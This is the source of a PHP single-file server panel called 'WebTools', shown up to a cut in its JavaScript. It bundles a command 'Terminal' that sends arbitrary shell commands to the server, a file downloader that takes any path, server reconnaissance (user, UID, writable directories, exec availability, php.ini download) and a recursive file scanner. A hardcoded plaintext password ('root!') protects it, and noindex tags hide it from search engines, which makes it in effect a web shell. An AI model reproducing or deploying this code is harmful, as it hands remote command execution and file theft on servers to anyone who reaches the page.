<?php

    /* 
        - CREATE BY FORDEVELOPERTOOLS WEB DEVELOPER TEAM
        - AUTHOR: NUR SHODIK ASSALAM
        - VERSION  1.0 BETA
        - RELEASE 5-20-2022
    */

    // started First
    session_start();
    date_default_timezone_set('asia/jakarta');

    class WebTools
    {   
        public $userImage = 'https://raw.githubusercontent.com/fordevelopertools/webtools/89bb08d74b725a17704ffb5cafa3c6f4e8acd7a7/logo.png';
        public $userName = 'NUR SHODIK ASSALAM';
        public $authPass = 'root!';
        public $loadImage = 'https://raw.githubusercontent.com/fordevelopertools/webtools/main/loading.gif';
        public $malwareCheckPayload = 'https://raw.githubusercontent.com/fordevelopertools/webtools/main/listing_malware_payload.txt';
        public $dirLoc = __DIR__;
        public $fileLoc = __FILE__;
        public $baseLink = './webtools.php';

        public function __construct(){
            // something
        }

        public function domainName(){
            $getDomain = trim($_SERVER['SERVER_NAME']) !== '' ?  trim($_SERVER['SERVER_NAME']) :
                (trim($_SERVER['SERVER_NAME']) ? trim($_SERVER['SERVER_NAME']) : '');
            return $getDomain;
        }

        public function getOS(){
            $getOsName = PHP_OS ? PHP_OS : 
                (PHP_OS_FAMILY ? PHP_OS_FAMILY : FALSE);
            return $getOsName;
        }

        public function is_shell_exec_available() {
            if (in_array(strtolower(ini_get('safe_mode')), array('on', '1'), true) || (!function_exists('exec'))) {
                return false;
            }
            $disabled_functions = explode(',', ini_get('disable_functions'));
            $exec_enabled = !in_array('exec', $disabled_functions);
            return ($exec_enabled) ? true : false;
        }

        public function ramInfo($getMem = null, $returnType = null){

            // check exec avaiable
            if($this->is_shell_exec_available()){
                // win exec get ram info
                if (strpos(strtolower($this->getOS()), 'win') !== false) {

                    @exec("wmic ComputerSystem get TotalPhysicalMemory", $totalRam);
                    @exec("wmic OS get FreePhysicalMemory", $freeRam);

                    if($totalRam == false || $totalRam == '' || 
                    $freeRam == false || $freeRam == '' ||
                    !is_array($totalRam) || !is_array($freeRam) ||
                    !isset($totalRam[0]) || trim($totalRam[0]) !== 'TotalPhysicalMemory' ||
                    !isset($freeRam[0]) || trim($freeRam[0]) !== 'FreePhysicalMemory' ||
                    !isset($totalRam[1]) || !isset($freeRam[1])
                    ){
                        return $returnType == null ? null : '0';
                    }else{

                        $valTotalRam = trim($totalRam[1]);
                        $valFreeRam = trim($freeRam[1]);
                        $valTotalRamKb = $valTotalRam / 1024;
                        $valUsedRam = $valTotalRamKb - $valFreeRam;

                        if ($getMem == 'total') {
                            $getMemTotal = ($valTotalRam / 1024) / 1024;
                            return number_format($getMemTotal, 2);
                        } elseif ($getMem == 'free') {
                            if ($returnType == null) {
                                $getMemFree = $valFreeRam / 1024;
                                return number_format($getMemFree, 2);
                            } else {
                                $getPercent = ($valFreeRam / $valTotalRamKb) * 100;
                                return number_format($getPercent, 2);
                            }
                        } elseif ($getMem == 'used') {
                            if ($returnType == null) {
                                $getMemUsed = $valUsedRam / 1024;
                                return number_format($getMemUsed, 2);
                            } else {
                                $getPercent = ($valUsedRam / $valTotalRamKb) * 100;
                                return number_format($getPercent, 2);
                            }
                        } else {
                            $getMemTotal = ($valTotalRam / 1024) / 1024;
                            return number_format($getMemTotal, 2);  
                        }
                    }
                
                } 
                // linux exec get ram info
                elseif(strpos(strtolower($this->getOS()), 'linux') !== false) {

                    if (file_exists('/proc/meminfo')) {
                        
                        $data = explode("\n", file_get_contents('/proc/meminfo'));
                        $meminfo = array();
                        $str_rep = array('KB', 'kb', 'Kb', 'kB');
                        $str_rep2 = array('', '', '', '');
                        foreach ($data as $line) {
                            list($key, $val) = explode(":", $line);
                            $meminfo[trim($key)] = trim(str_replace($str_rep, $str_rep2, $val));
                        }

                        if (is_array($meminfo) && count($meminfo) > 0) {
                            
                            if(
                                !isset($meminfo['MemTotal']) || !isset($meminfo['MemFree'])
                            ){
                                return $returnType == null ? null : '0';
                            }else{

                                $valTotalRam = trim($meminfo['MemTotal']);
                                $valFreeRam = trim($meminfo['MemFree']);
                                $valTotalRamKb = $valTotalRam;
                                $valUsedRam = $valTotalRamKb - $valFreeRam;

                                if ($getMem == 'total') {
                                    $getMemTotal = $valTotalRam / 1024;
                                    return number_format($getMemTotal, 2);
                                } elseif ($getMem == 'free') {
                                    if ($returnType == null) {
                                        $getMemFree = $valFreeRam / 1024;
                                        return number_format($getMemFree, 2);
                                    } else {
                                        $getPercent = ($valFreeRam / $valTotalRamKb) * 100;
                                        return number_format($getPercent, 2);
                                    }
                                } elseif ($getMem == 'used') {
                                    if ($returnType == null) {
                                        $getMemUsed = $valUsedRam / 1024;
                                        return number_format($getMemUsed, 2);
                                    } else {
                                        $getPercent = ($valUsedRam / $valTotalRamKb) * 100;
                                        return number_format($getPercent, 2);
                                    }
                                } else {
                                    $getMemTotal = $valTotalRam / 1024;
                                    return number_format($getMemTotal, 2);  
                                }
                            }
                        } else {
                            return $returnType == null ? null : '0';
                        }
                    } else {
                        return $returnType == null ? null : '0';
                    }
                } else {
                    return $returnType == null ? null : '0';
                }
            }else{
                return $returnType == null ? null : '0';
            }
        }

        public function varClean($vartoClean = null){
            $vartoClean = trim(strip_tags($vartoClean));
            return $vartoClean;
        }

        public function redirect($url = null){
            if (trim($url) !== '') {
                header('location: '.$url);
            } else {
                return false;
            }
        }

        public function checkLogin(){
            if (isset($_SESSION['login'])) {
                return true;
            } else {
                return false;
            }
        }

        public function login_auth($passInput = null){
            if (trim($passInput) !== null) {
                if (trim($passInput) == $this->authPass) {
                    $_SESSION['login']  =  $passInput;
                    return true;
                } else {
                    return false;
                }
            } else {
                return false;
            }
        }

        public function logout($link = './'){
            session_destroy();
            self::redirect($link);
        }

        public function download($filename = null){
            if($filename !== null){
                $file = $filename; 
                if(is_file($file)){
                    header("Expires: 0");
                    header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
                    header("Cache-Control: no-store, no-cache, must-revalidate");
                    header("Cache-Control: post-check=0, pre-check=0", false);
                    header("Pragma: no-cache");
                    $ext = pathinfo($file, PATHINFO_EXTENSION);
                    $basename = pathinfo($file, PATHINFO_BASENAME);
                    header("Content-type: application/".$ext);
                    header('Content-length: '.filesize($file));
                    header("Content-Disposition: attachment; filename=\"$basename\"");
                    ob_clean(); 
                    flush();
                    readfile($file);
                    exit;
                } else {
                    return false;
                }
            } else {
                return false;
            }
        }

        public function chekRoot(){
            if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
                return true;
            } else {
                return false;
            }
        }

        public function getDir(){
            return trim($_SERVER['DOCUMENT_ROOT']);
        }

        public function getDiskSize($dir = './'){
            $totalSpace = disk_total_space($dir);
            $totalSpace = ($totalSpace / 1024) / 1024;
            return number_format($totalSpace, 2);
        }

        public function getFreeDisk($dir = './', $returnType = null){
            
            $totalSpace = disk_total_space($dir);
            $freeSpace = disk_free_space($dir);

            if ($returnType == 'percent') {

                $getPercent = ($freeSpace / $totalSpace) * 100;
                return number_format($getPercent, 2);
                
            } else {
                $freeSpace = ($freeSpace / 1024) / 1024;
                return number_format($freeSpace, 2);
            }
        }

        public function diskUsedSpace($dir = './', $returnType = null){
            $totalSpace = disk_total_space($dir);
            $freeSpace = disk_free_space($dir);

            $usedSpace = $totalSpace - $freeSpace;

            if ($returnType == 'percent') {

                $getPercent = ($usedSpace / $totalSpace) * 100;
                return number_format($getPercent, 2);

            }else{
                $usedSpace = ($usedSpace / 1024) / 1024;
                return number_format($usedSpace, 2);
            }

        }
        
        public function cekdir(){
            if (isset($_GET['path'])) {
                $lokasi = trim($_GET['path']);
            } else {
                $lokasi = getcwd();
            }
            if (is_writable($lokasi)) {
                return true;
            } else {
                return false;
            }
        }

        public function loadMetaLink(){
            echo '
                <meta name="robots" content="noindex">
                <meta name="googlebot" content="noindex">
                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
        
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/fontawesome.min.css" integrity="sha512-xX2rYBFJSj86W54Fyv1de80DWBq7zYLn2z0I9bIhQG+rxIF6XVJUpdGnsNHWRa6AvP89vtFupEPDP8eZAtu9qA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/brands.min.css" integrity="sha512-OivR4OdSsE1onDm/i3J3Hpsm5GmOVvr9r49K3jJ0dnsxVzZgaOJ5MfxEAxCyGrzWozL9uJGKz6un3A7L+redIQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
            ';
        }

        public function goHome() {
            echo '
                <style>
                    .reload-page {
                        color: white;
                        background: var(--primary-color);
                        padding: 15px;
                        position: fixed;
                        bottom: 20px;
                        right: 20px;
                        border-radius: 50%;
                        height: 40px;
                        width: 40px;
                        font-size: 14px;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        text-decoration: none;
                        border: 2px solid white;
                    }
                    .reload-page:hover {
                        color: #6c757d;
                    }
                </style>
                <!-- reload page -->
                <a href="'. $this->baseLink .'" class="reload-page">
                    <i class="fa-solid fa-home"></i>
                </a>
            ';
        }

        public function addCssGlobal($addCss = null) {
            echo '
                <style>
                    :root {
                        --primary-color: #1B1E2B;
                        --secondary-color: #292D3E;
                        --body-text-header-font-size: 16px;
                        --body-text-content-font-size: 14px;
                    }
                    
                    body {
                        font-family: "Dosis", "cursive" !important;
                        background: var(--secondary-color) !important;
                        font-size: var(--body-text-content-font-size) !important;
                    }

                    '. $addCss .'

                </style>
            ';
        }

        public function strSearch($haystack, $needles=array(), $offset=0) {
            $chr = array();
            foreach($needles as $needle) {
                    $res = strpos($haystack, $needle, $offset);
                    if ($res !== false) $chr[$needle] = $res;
            }
            if(empty($chr)) return false;
            return min($chr);
        }

        public function fileScan($folderScan = null, $searchFiles = array(), $searchBy = null/*, &$results = array()*/){
            if ($folderScan !== null) {

                $dir = $folderScan;
                
                if (is_dir($dir)) {
                    
                    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folderScan));
                    $files = array(); 
                    foreach ($rii as $file) {
                        if ($file->isDir()){
                            if ($file != "." && $file != "..") {
                                if($searchBy == 'folder' || $searchBy == 'ff'){
                                    //check if search empty or not
                                    if (count($searchFiles) > 0) {
                                        if ($this->strSearch(trim($file->getPathname()), $searchFiles, 0)) {
                                            $files[] = [
                                                'item'  =>  $file->getPathname(),
                                                'type'  =>  'folder'
                                            ];
                                        }
                                    } else {
                                        $files[] = [
                                            'item'  =>  $file->getPathname(),
                                            'type'  =>  'folder'
                                        ];
                                    }
                                }
                            }
                            continue;
                        }

                        //check if search empty or not
                        if (count($searchFiles) > 0) {
                            if ($this->strSearch(trim($file->getPathname()), $searchFiles, 0)) {
                                if($searchBy == 'file' || $searchBy == 'ff'){
                                    $files[] = [
                                        'item'  =>  $file->getPathname(),
                                        'type'  =>  'file'
                                    ];
                                }
                            } 
                        }else {
                            if($searchBy == 'file' || $searchBy == 'ff'){
                                $files[] = [
                                    'item'  =>  $file->getPathname(),
                                    'type'  =>  'file'
                                ]; 
                            }
                        }
                        
                    }

                    return $files;

                } else {
                    return false;
                }
                
                // $files = scandir($dir);
            
                // foreach ($files as $key => $value) {
                //     $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
                //     if (!is_dir($path)) {
                        
                //         // check if search empty or not
                //         if (count($searchFiles) > 0) {
                //             if ($this->strSearch(trim($path), $searchFiles, 0)) {
                //                 if($searchBy == 'file' || $searchBy == 'ff'){
                //                     $results[] = $path;
                //                 }
                //             }
                //         } else {
                //             if($searchBy == 'file' || $searchBy == 'ff'){
                //                 $results[] = $path;
                //             }
                //         }
                //     } else if ($value != "." && $value != "..") {
                //         self::fileScan($path, $searchFiles, $searchBy, $results[$path]);
                //         if($searchBy == 'folder' || $searchBy == 'ff'){
                //             $results[] = $path;
                //         }
                        
                //     }
                // }
                // print_r($results);
            }else{
                return false;
            }
        }

        public function pageActive(){
            if (isset($_GET['page']) && trim($_GET['page']) !== '') {
                $page = trim($_GET['page']);
                return strtolower($page);
            } else {
                return 'dashboard';
            }
            
        }
    }

    // ins system
    $webTools = new webTools();
    
    function dashboardPage($webTools = false) {

        // START DASHBOARD

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WEB TOOLS</title>
    <?= $webTools->loadMetaLink(); ?>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Dosis:wght@200;300;400;500;600;700;800&display=swap');
        @import url('https://fonts.googleapis.com/css?family=Bungee:wght@100;200;300;400;500;600;700;800');

        * {
            margin: 0px;
            padding: 0px;
            box-sizing: border-box;
        }

        :root {
            --primary-color: #1B1E2B;
            --secondary-color: #292D3E;
            --body-text-header-font-size: 16px;
            --body-text-content-font-size: 14px;
        }
        
        body {
            font-family: "Dosis", cursive;
            background: var(--secondary-color);
            font-size: var(--body-text-content-font-size);
        }

        h1 { font-size: 36px; font-weight: 600; }
        h2 { font-size: 32px; font-weight: 600; }
        h3 { font-size: 24px; font-weight: 600; }
        h4 { font-size: 18px; font-weight: 600; }
        h5 { font-size: 16px; font-weight: 600; }
        h6 { font-size: 14px; font-weight: 600; }

        .bg-black {
            background-color: black;
        }

        .separator-prim {
            height: 1px;
            display: block;
            background: var(--primary-color);
            margin-top: 8px;
            margin-bottom: 8px;;
        }

        .separator-sec {
            height: 1px;
            display: block;
            background: var(--secondary-color);
            margin-top: 8px;
            margin-bottom: 8px;
        }

        .bg-prim {
            background: var(--primary-color);
        }

        .bg-sec {
            background: var(--secondary-color) !important;
        }

        .text-second-color {
            color: var(--secondary-color);
        }

        .height-full {
            min-height: 100vh; 
        }

        .user-logo {
            border-radius: 50%;
            padding: 5px;
            height: 60px;
            width: 60px;
            border: 3px solid #292D3E;
            /* filter: contrast(200%); */
            margin-bottom: 20px;
        }

        .user-name {
            font-weight: 600;
            font-size: var(--body-text-header-font-size);
        }

        .sidebar-left {
            padding-top: 50px;
            padding-bottom: 50px;
            user-select: none;
        }

        .body-content {
            padding-top: 50px;
            padding-bottom: 50px;
        }

        .text-small {
            font-size: var(--body-text-header-font-size);
            font-weight: 400;
        }

        .overflow-active {
            overflow: auto;
            overflow-x: hidden;
        }

        .text-label {
            font-weight: 500;
            color: #fff;
            font-size: var(--body-text-header-font-size);
        }

        .text-green {
            color: #ff0f;
        }

        /* scrollbar */
        /* width */
        ::-webkit-scrollbar {
            width: 5px;
        }

        /* Track */
        ::-webkit-scrollbar-track {
            background: var(--secondary-color); 
        }
        
        /* Handle */
        ::-webkit-scrollbar-thumb {
            background: black; 
        }

        /* Handle on hover */
        ::-webkit-scrollbar-thumb:hover {
            background: #555; 
        }

        .progress {
            font-size: 11px;
            height: 10px;
        }

        .progress-bar {
            transition: ease-out .8s;
            width: 0%;
        }

        .user-selected-active {
            user-select: text !important;
        }

        .elem-content {
            margin: 10px;
            background-color: var(--primary-color);
        }

        /* tools */
        .tools-item {
            margin: 10px;
            background-color: var(--primary-color);
        }

        .tools-item:hover {
            box-shadow: 0px 0px 10px var(--primary-color);
        }

        .tools-icon {
            font-size: 32px;
            padding: 10px;
            background-color: var(--secondary-color);
        }

        .tools-name {
            font-size: var(--body-text-header-font-size);
        }

        .tools-link {
            text-decoration: none !important;
        }

        .box-terminal {
            height: 400px;
        }
        .terminal-log {
            font-size: 18px !important;
        }

        .bg-transparent {
            background-color: rgba(0, 0, 0, .0) !important;
        }

        .form-control {
            background: rgba(0, 0, 0, .0) !important;
            border-color: #6c757d !important;
        }

        .scroll-active {
            overflow: auto;
        }

        .badge-custom-notice-term {
            border-radius: 0px;
            font-size: 13px;
        }

        .fixed-full-height {
            min-height: 100vh;
            max-height: 100vh;
        }

        .set-scan-file {
            cursor: pointer;
        }

    </style>
</head>
<body>
    
    <div class="container-fluid">
        <div class="row height-full">
            <!-- sidebar content -->
            <div class="col-md-3 bg-prim text-second-color sidebar-left height-full overflow-active">
                <!-- profile content login -->
                <div class="row mx-auto my-auto">
                    <div class="col-md-12 mx-auto my-auto">
                        <center>
                            <img src="<?= $webTools->userImage; ?>" alt="" class="user-logo">
                            <br>
                            <span>
                                <div class="text-small text-white">WELCOME!</div>
                                <small class="user-name text-white"><?= $webTools->userName ?></small>
                            </span>
                            <br><br>
                            <a href="<?= $webTools->baseLink ?>?logout=true" class="text-white btn">
                                Logout <i class="fa-solid fa-arrow-right-from-bracket"></i>                 
                            </a>
                        </center>
                    </div>
                </div>

                <div class="separator-sec"></div>
                <div class="row mx-auto my-auto">
                    <div class="col-md-12">
                        <div class="row">
                            <div class="col-12">
                                <div class="text-label">DISK INFO</div>
                                <div class="mt-1 text-white">Total Space: <?= $webTools->getDiskSize($webTools->getDir()); ?> MB</div>
                                <div class="progress">
                                    <div class="progress-bar progress-bar-animated progress-bar-striped" role="progressbar" style="width: 100%;"  aria-valuemin="0" aria-valuemax="100">100%</div>
                                </div>
                                <div class="mt-1 text-white">Free Space: <?= $webTools->getFreeDisk($webTools->getDir()); ?> MB</div>
                                <div class="progress">
                                    <div class="progress-bar progress-bar-animated progress-bar-striped bg-success" role="progressbar" style="width: <?= $webTools->getFreeDisk($webTools->getDir(), 'percent'); ?>%;"  aria-valuemin="0" aria-valuemax="100"><?= $webTools->getFreeDisk($webTools->getDir(), 'percent'); ?>%</div>
                                </div>
                                <div class="mt-1 text-white">Used Space: <?= $webTools->diskUsedSpace($webTools->getDir()); ?> MB</div>
                                <div class="progress">
                                    <div class="progress-bar progress-bar-animated progress-bar-striped bg-danger" role="progressbar" style="width: <?= $webTools->diskUsedSpace($webTools->getDir(), 'percent'); ?>%;"  aria-valuemin="0" aria-valuemax="100"><?= $webTools->diskUsedSpace($webTools->getDir(), 'percent'); ?>%</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="separator-sec"></div>
                <div class="row mx-auto my-auto">
                    <div class="col-md-12">
                        <div class="row">
                            <div class="col-12">
                                <div class="text-label">RAM INFO</div>
                                <div class="mt-1 text-white">Total Space: <?= $webTools->ramInfo(); ?> MB</div>
                                <div class="progress">
                                    <div class="progress-bar progress-bar-animated progress-bar-striped" role="progressbar" style="width: 100%;"  aria-valuemin="0" aria-valuemax="100">100%</div>
                                </div>
                                <div class="mt-1 text-white">Free Space: <?= $webTools->ramInfo('free'); ?> MB</div>
                                <div class="progress">
                                    <div class="progress-bar progress-bar-animated progress-bar-striped bg-success" role="progressbar" style="width: <?= $webTools->ramInfo('free', 'percent'); ?>%;"  aria-valuemin="0" aria-valuemax="100"><?= $webTools->ramInfo('free', 'percent'); ?>%</div>
                                </div>
                                <div class="mt-1 text-white">Used Space: <?= $webTools->ramInfo('used'); ?> MB</div>
                                <div class="progress">
                                    <div class="progress-bar progress-bar-animated progress-bar-striped bg-danger" role="progressbar" style="width: <?= $webTools->ramInfo('used', 'percent'); ?>%;"  aria-valuemin="0" aria-valuemax="100"><?= $webTools->ramInfo('used', 'percent'); ?>%</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="separator-sec"></div>
                <div class="row mx-auto my-auto">
                    <div class="col-md-12">
                        <div class="row">
                            <div class="col-6">
                                <div class="text-label">ROOT DIR</div>
                                <div>
                                <?php 
                                    if ($webTools->chekRoot()) {
                                        echo "<div class='text-green'>Writeable</div>";
                                    } else {
                                        echo "<div class='text-danger'>No Writeable</div>";
                                    }
                                ?>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="text-label">CURRENT DIR</div>
                                <div>
                                <?php 
                                    if ($webTools->cekdir()) {
                                        echo "<div class='text-green'>Writeable</div>";
                                    } else {
                                        echo "<div class='text-danger'>No Writeable</div>";
                                    }
                                ?>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="separator-sec"></div>
                <div class="row mx-auto my-auto user-selected-active">
                    <div class="col-md-12">
                        <div class="text-label">INFO</div>
                        <div class="mt-1 text-white"><b>Date:</b> <?= date('H:i, d-m-Y'); ?></div>
                        <div class="mt-1 text-white"><b>User:</b> <?= @get_current_user(); ?> [UID <?= @getmyuid(); ?>]</div>
                        <div class="mt-1 text-white"><b>Server:</b> <?= $_SERVER['SERVER_SOFTWARE']; ?></div>
                        <div class="mt-1 text-white"><b>System:</b> <?= @php_uname(); ?> | phpversion</div>
                        <div class="mt-1 text-white"><b>Current Dir:</b> <?= @getcwd(); ?></div>
                        <div class="mt-1 text-white"><b>Exec Info:</b> <?= $webTools->is_shell_exec_available() ? '<span class="badge badge-success bg-success">Enabled</span>' : '<span class="badge badge-success bg-success">Disabled</span>'; ?></div>
                        <div class="mt-1 text-white"><b>PHP Info:</b> 
                            <a href="<?= $webTools->baseLink; ?>?page=phpinfo" target="_blank">Open</a>
                        </div>
                        <div class="mt-1 text-white"><b>PHP Ini Path:</b> <?= php_ini_loaded_file(); ?> | <a href="<?= $webTools->baseLink; ?>?page=download&file=<?= php_ini_loaded_file(); ?>" target="_blank">Download</a>
                        </div>
                    </div>
                </div>

                <div class="separator-sec mt-5"></div>
                <div class="row mx-auto my-auto mt-5 pt-2">
                    <div class="col-md-12">
                        <div class="text-white">&copy;Copyright <?= date('Y') ?>. By <a href="https://github.com/fordevelopertools" target="_blank" class="text-white">ForDeveloperTools</a>.</div>
                    </div>
                </div>
            </div>
            <!-- end sidebar content -->

            <!-- body content -->
            <div class="col-md-9 body-content">
                <?php if($webTools->pageActive() == 'dashboard'){ ?>
                <div class="row">
                    <div class="col-md-4">
                        <a href="<?=  $webTools->baseLink; ?>?page=terminal" class="tools-link">
                            <div class="card tools-item bg-prim">
                                <div class="card-body text-white">
                                    <div class="row">
                                        <div class="col-3 my-auto mx-auto">
                                            <i class="fa-solid fa-terminal text-white tools-icon"></i>
                                        </div>
                                        <div class="col-9 my-auto mx-auto">
                                            <div class="tools-name">Terminal</div>
                                            
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-md-4">
                        <a href="<?=  $webTools->baseLink; ?>?page=filescan" class="tools-link">
                            <div class="card tools-item bg-prim">
                                <div class="card-body text-white">
                                    <div class="row">
                                        <div class="col-3 my-auto mx-auto">
                                            <i class="fa-solid fa-magnifying-glass text-white tools-icon"></i>
                                        </div>
                                        <div class="col-9 my-auto mx-auto">
                                            <div class="tools-name">File Scan</div>
                                            
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-md-4">
                        <a href="<?=  $webTools->baseLink; ?>?page=malware-perm-scan" class="tools-link">
                            <div class="card tools-item bg-prim">
                                <div class="card-body text-white">
                                    <div class="row">
                                        <div class="col-3 my-auto mx-auto">
                                            <i class="fa-solid fa-shield-virus text-white tools-icon"></i>
                                        </div>
                                        <div class="col-9 my-auto mx-auto">
                                            <div class="tools-name">Scan Malware & Permission (Coming Soon)</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-4">
                        <a href="<?=  $webTools->baseLink; ?>?page=file-manager" class="tools-link">
                            <div class="card tools-item bg-prim">
                                <div class="card-body text-white">
                                    <div class="row">
                                        <div class="col-3 my-auto mx-auto">
                                            <i class="fa-solid fa-folder-closed text-white tools-icon"></i>
                                        </div>
                                        <div class="col-9 my-auto mx-auto">
                                            <div class="tools-name">File Manager (Coming Soon)</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-md-4">
                        <a href="<?=  $webTools->baseLink; ?>?page=zip-manager" class="tools-link">
                            <div class="card tools-item bg-prim">
                                <div class="card-body text-white">
                                    <div class="row">
                                        <div class="col-3 my-auto mx-auto">
                                            <i class="fa-solid fa-file-zipper text-white tools-icon"></i>
                                        </div>
                                        <div class="col-9 my-auto mx-auto">
                                            <div class="tools-name">Zip Manager (Coming Soon)</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-md-4">
                        <a href="<?=  $webTools->baseLink; ?>?page=database-manager" class="tools-link">
                            <div class="card tools-item bg-prim">
                                <div class="card-body text-white">
                                    <div class="row">
                                        <div class="col-3 my-auto mx-auto">
                                            <i class="fa-solid fa-database text-white tools-icon"></i>
                                        </div>
                                        <div class="col-9 my-auto mx-auto">
                                            <div class="tools-name">Database Manager (Coming Soon)</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                    
                </div>
                

                <?php } elseif($webTools->pageActive() == 'terminal'){ ?>

                <div class="row">
                    <div class="col-md-12">
                        <div class="card elem-content bg-prim text-white">
                            <div class="card-header">
                                <h4>TERMINAL</h4>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-12">
                        <div class="card elem-content bg-prim text-white">
                            <div class="card-header">
                                <div class="row">
                                    <div class="col-md-9">
                                        <div>
                                            <strong><?= $webTools->is_shell_exec_available() ? 'ACTIVE': 'DISABLED BY SYSTEM'; ?></strong>
                                            <div>
                                                <?= $_SERVER['COMSPEC']; ?>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-3 text-right">
                                        <button type="button" id="clearLogTerminal" onclick="clearLogTerminal('#terminal-log');" class="btn bg-primary text-white">
                                            Clear
                                        </button>
                                    </div>
                                </div>
                            </div>
                            <div class="card-body  box-terminal scroll-active">
                                <div id="terminal-log"></div>
                            </div>
                            <div class="card-footer">
                                <form id="terminal-input" action="" method="post">
                                    <div class="input-group mb-3 bg-transparent">

                                        <input type="text" hidden="hidden" class="form-control d-none" name="info_post" id="info_post" value="<?= @get_current_user(); ?>-<?= @getcwd(); ?>~" class="bg-transparent text-white" style="color: white !important;" required/>

                                        <input type="text" class="form-control" name="command" id="command" placeholder="<?= @get_current_user(); ?>-<?= @getcwd(); ?>~" class="bg-transparent text-white" style="color: white !important;" required/>
                                        <div class="input-group-append">
                                            <button id="submitCommand" class="btn btn-outline-secondary bg-transparent" type="submit">
                                                <i class="fa-solid fa-arrow-right"></i>
                                            </button>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>

                <?php } elseif($webTools->pageActive() == 'filescan'){ ?>

                    <div class="row">
                    <div class="col-md-12">
                        <div class="card elem-content bg-prim text-white">
                            <div class="card-header">
                                <h4>FILE SCAN</h4>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-12">
                        <div class="card elem-content bg-prim text-white">
                            <div class="card-header">
                                
                                <div class="row">
                                    <div class="col-md-9">

                                    </div>
                                    <div class="col-md-3 text-right">
                                        <button type="button" id="clearLogTerminal" onclick="clearLogFileScan('#file-scan-log');" class="btn bg-primary text-white">
                                            Clear
                                        </button>
                                    </div>
                                </div>

                                <div class="separator-sec"></div>

                                <form id="file-scan-input" action="" method="post">
                                    <div class="input-group mb-3 bg-transparent">
                                        <input type="text" class="form-control" name="scan_dir" id="scan_dir" placeholder="Directory Location..." value="<?= $webTools->dirLoc; ?>" class="bg-transparent text-white" style="color: white !important;" required/>
                                        <input type="text" class="form-control" name="scan_payload" id="scan_payload" placeholder="example.php (use ';' for multiple)" class="bg-transparent text-white" style="color: white !important;" />
                                        <select class="form-control" name="scan_for" id="scan_for" style="color: grey;" required/>
                                            <option selected disabled/>Scan For...</option>
                                            <option value="folder">Directory</option>
                                            <option value="file">File</option>
                                            <option value="ff">Both</option>
                                        </select>
                                            <div class="input-group-append">
                                            <button id="submitFileScan" class="btn btn-outline-secondary bg-transparent" type="submit">
                                                <i class="fa-solid fa-search"></i>
                                            </button>
                                        </div>
                                    </div>
                                </form>
                            </div>
                            <div class="card-body box-file-scan fixed-full-height scroll-active">
                                <div id="file-scan-log"></div>
                            </div>
                            <div class="card-footer">
                                
                            </div>
                        </div>
                    </div>
                </div>

                <?php } else{ /*something*/ } ?>
            </div>
            <!-- end body content -->
        </div>
                                    
        <!-- reload -->
        <?= $webTools->goHome(); ?>
    </div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>

    function removeElem(elem = null){
        if (elem == null) {
            return null;
        } else {
            $(elem).remove();
        }
    }

    function removeVal(elemID =null){
        if (elemID == null) {
            return null;
        } else {
            $(elemID).val('');
        }
    }

    function clearLogTerminal(elemId = null){
        removeElem(elemId);
        $('.box-terminal').html('<div id="terminal-log"></div>');
    }

    $("#terminal-input").submit( function () {
            
        var command = $('#command').val(); 
        var infoPost = $('#info_post').val(); 

        
        $('#submitCommand').attr("disabled", true);

        $('#terminal-log').prepend('<div class="box-msg"><div class="loadingLogTerm"><img src="<?= $webTools->loadImage ?>" width="20px" height="20px" /> Loading...</div></div>');

        $.ajax({
            type: 'POST',
            url: "<?= $webTools->baseLink; ?>?page=terminal-execute",
            dataType: 'html',
            cache: false, 
            data: {
                command: command,
                info_post: infoPost
            },
            success: function(data){
                removeElem('.loadingLogTerm');
                removeVal('#command');
                $('#submitCommand').attr("disabled", false);
                $('#terminal-log').prepend('<div class="box-msg">'+ data +'</div>'); 

                            
            },
            error: function (e) {
                removeElem('.loadingLogTerm');
                $('#submitCommand').attr("disabled", false);
                $('#terminal-log').prepend('<div class="box-msg">Failed. Error Message: '+ e +'</div>'); 
            }
        });

        return false;   
    });

    function clearLogFileScan(elemId = null){
